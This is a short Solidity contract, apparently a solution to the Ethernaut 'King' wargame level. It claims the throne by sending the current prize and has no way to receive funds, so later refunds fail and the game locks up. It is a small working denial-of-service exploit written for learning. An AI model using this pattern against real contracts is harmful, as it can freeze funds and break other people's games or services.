// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Hack {
    constructor(address payable _target) payable {
        uint prize = King(_target).prize();
        (bool success, ) = _target.call{value: prize}("");
        require(success, "call failed.");
    }
}
